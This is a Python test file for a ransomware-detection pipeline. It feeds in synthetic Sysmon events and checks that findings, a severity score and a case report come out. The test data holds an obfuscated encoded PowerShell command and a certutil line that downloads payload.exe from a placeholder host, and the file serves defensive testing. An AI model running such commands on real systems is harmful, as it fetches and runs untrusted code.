from ransomeye import pipeline
from ransomeye.report import generate_case_report


def test_suspicious_process_reaches_assessment_and_report(
    monkeypatch,
    tmp_path,
):
    events = [
        {
            "event_id": "detect-powershell",
            "timestamp": "2026-08-08T17:30:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "pid": "5000",
            "parent_pid": "4000",
            "process_guid": "powershell-guid",
            "file_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": (
                "powershell.exe -NoProfile "
                "-EncodedCommand SQBFAFgA"
            ),
            "metadata": {"rule": "Sysmon Event ID 1"},
        },
        {
            "event_id": "detect-certutil",
            "timestamp": "2026-08-08T17:30:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "pid": "6000",
            "parent_pid": "5000",
            "process_guid": "certutil-guid",
            "file_path": r"C:\Windows\System32\certutil.exe",
            "command_line": (
                "certutil.exe -urlcache -split -f "
                "https://example.invalid/payload.exe"
            ),
            "metadata": {"rule": "Sysmon Event ID 1"},
        },
    ]

    monkeypatch.setattr(
        pipeline,
        "read_process_creation_events",
        lambda limit: events,
    )

    database_path = tmp_path / "detection.db"

    result = pipeline.collect_and_store(
        database_path=database_path,
        case_id="RE-DETECTION-INT-001",
        case_name="Synthetic Detection Test",
        host="TEST-HOST",
        limit=20,
    )

    assert result["events_collected"] == 2
    assert result["findings_saved"] >= 2
    assert result["assessment"]["score"] > 0
    assert result["assessment"]["severity"] != "SAFE"

    report = generate_case_report(
        database_path,
        "RE-DETECTION-INT-001",
    )

    assert "powershell.exe" in report
    assert "certutil.exe" in report
    assert "FINDINGS" in report
    assert "No findings." not in report
